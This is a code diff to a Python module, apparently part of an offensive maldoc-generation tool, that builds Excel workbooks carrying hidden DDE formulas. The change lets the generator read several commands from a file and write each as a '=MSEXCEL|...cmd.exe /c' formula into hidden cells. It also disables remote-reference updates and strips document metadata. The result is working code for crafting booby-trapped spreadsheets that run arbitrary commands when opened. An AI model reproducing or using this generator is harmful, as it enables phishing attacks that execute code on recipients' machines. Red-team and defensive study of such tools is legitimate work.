@@ -9,8 +9,8 @@ if sys.platform == "win32":
     import win32com.client # @UnresolvedImport
 
 import logging
+import shlex
 from modules.excel_gen import ExcelGenerator
-from common import utils
 
 
 class ExcelDDE(ExcelGenerator):
@@ -22,24 +22,58 @@ class ExcelDDE(ExcelGenerator):
     def run(self):
         logging.info(" [+] Generating MS Excel with DDE document...")
         try:
+            
+            cmdFile = self.getCMDFile()
+            valuesFileContent = ""
+            if cmdFile:
+                with open(cmdFile, 'r') as f:
+                    valuesFileContent = f.read().rstrip()
+            
             # Get command line
             paramDict = OrderedDict([("Cmd_Line",None)])      
             self.fillInputParams(paramDict)
             command = paramDict["Cmd_Line"]
-            
-            
+
+            commands = []
+
+            if cmdFile and valuesFileContent:
+                command = valuesFileContent
+                for l in valuesFileContent.splitlines():
+                    if l:
+                        commands.append(l)
+            else:
+                commands.append(command)
+
+                
             logging.info("   [-] Open document...")
             # open up an instance of Excel with the win32com driver\        \\
             excel = win32com.client.Dispatch("Excel.Application")
             # do the operation in background without actually opening Excel
             #excel.Visible = False
             workbook = excel.Workbooks.Open(self.outputFilePath)
+            workbook.UpdateRemoteReferences = False
     
-            logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
-            
-            ddeCmd = r"""=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c %s'!A1""" % command.rstrip()
-            excel.Cells(1, 26).Formula = ddeCmd
-            excel.Cells(1, 26).FormulaHidden = True
+            logging.info("   [-] Inject DDE field...")
+
+            ddeCmds = []
+            for command in commands:
+                ddeCmd = ""
+                if command[1] == ":" or command[2] == ":": # command's is an image absolute path, possibly quoted
+                    commandBeginning, commandEnd = command[:4], command[4:]
+                    commandBeginning = commandBeginning.replace("c:\\", "\\..\\..\\").replace("C:\\", "\\..\\..\\")
+                    command = commandBeginning + commandEnd
+                    ddeCmd = "=MSEXCEL|'%s'!A1" % command.rstrip()
+                else:
+                    logging.info("   [-] Using cmd.exe to execute the desired command")
+                    ddeCmd = r"""=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c %s'!A1""" % command.rstrip()
+                ddeCmds.append(ddeCmd)
+
+            colNum = 26
+            for ddeCmd in ddeCmds:
+                excel.Cells(1, colNum).Formula = ddeCmd
+                excel.Cells(1, colNum).FormulaHidden = True
+                logging.info("   [-] The DDE being used is: %s" %excel.Cells(1, colNum).Formula)
+                colNum += 1
             
             # Remove Informations
             logging.info("   [-] Remove hidden data and personal info...")
@@ -49,7 +83,6 @@ class ExcelDDE(ExcelGenerator):
             excel.DisplayAlerts=False
             excel.Workbooks(1).Close(SaveChanges=1)
             excel.Application.Quit()
-            
             # garbage collection
             del excel
             logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
@@ -61,8 +94,5 @@ class ExcelDDE(ExcelGenerator):
             objExcel = win32com.client.Dispatch("Excel.Application")
             objExcel.Application.Quit()
             del objExcel
-            # If it Application.Quit() was not enough we force kill the process
-            if utils.checkIfProcessRunning("Excel.exe"):
-                utils.forceProcessKill("Excel.exe")
-            
+
         
